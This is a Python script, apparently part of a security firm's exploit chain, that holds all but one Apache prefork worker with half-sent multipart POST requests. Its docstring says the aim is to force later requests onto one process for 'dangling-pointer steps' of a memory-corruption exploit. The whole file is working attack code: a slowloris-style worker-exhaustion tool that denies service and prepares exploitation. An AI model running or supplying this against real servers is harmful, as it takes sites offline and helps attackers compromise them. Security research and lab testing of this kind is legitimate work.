#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

"""hold_workers.py - pin the target to one free worker by occupying the rest.

A prefork child is assigned per connection, and it blocks reading the request body until Apache's
Timeout. So `MaxRequestWorkers - 1` connections that send headers plus one body byte occupy every
child but one; whatever request arrives next must be served by that child, which is what keeps the
dangling-pointer steps on the same process.

The sockets are held until --hold seconds pass or the process is asked to stop, then closed so the
children come back to the idle pool.

usage:
  hold_workers.py --url http://TARGET/index.php --count 149 --hold 120 &
"""
import argparse
import signal
import socket
import sys
import time

BOUNDARY = b"C" * 10


def hold(host, port, path, count, timeout):
    """Open `count` half-sent requests; returns the sockets that connected."""
    request = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
               "Content-Type: multipart/form-data; boundary=%s\r\n"
               "Content-Length: %d\r\nConnection: close\r\n\r\n"
               % (path, host, port, BOUNDARY.decode(), 1 << 20)).encode()
    held = []
    for _ in range(count):
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
        except OSError:
            break
        try:
            # One body byte only: the child stays in read() with the rest of the body outstanding,
            # so it cannot accept another request and cannot finish this one.
            sock.sendall(request + b"x")
        except OSError:
            sock.close()
            break
        held.append(sock)
    return held


def main():
    ap = argparse.ArgumentParser(description="occupy every worker but one")
    ap.add_argument("--url", default="http://127.0.0.1:18110/index.php")
    ap.add_argument("--count", type=int, default=149, help="MaxRequestWorkers - 1")
    ap.add_argument("--hold", type=float, default=120.0)
    ap.add_argument("--connect-timeout", type=float, default=10.0)
    args = ap.parse_args()

    hostport = args.url.split("://", 1)[-1]
    hostport, _, path = hostport.partition("/")
    host, _, port = hostport.partition(":")
    sockets = hold(host, int(port or 80), "/" + path, args.count, args.connect_timeout)
    print("holding %d/%d workers" % (len(sockets), args.count), flush=True)

    stopping = []

    def stop(_signum, _frame):
        stopping.append(True)

    signal.signal(signal.SIGTERM, stop)
    signal.signal(signal.SIGINT, stop)
    deadline = time.time() + args.hold
    while not stopping and time.time() < deadline:
        time.sleep(0.2)
    for sock in sockets:
        try:
            sock.close()
        except OSError:
            pass
    print("released %d workers" % len(sockets), flush=True)
    return 0 if sockets else 1


if __name__ == "__main__":
    sys.exit(main())
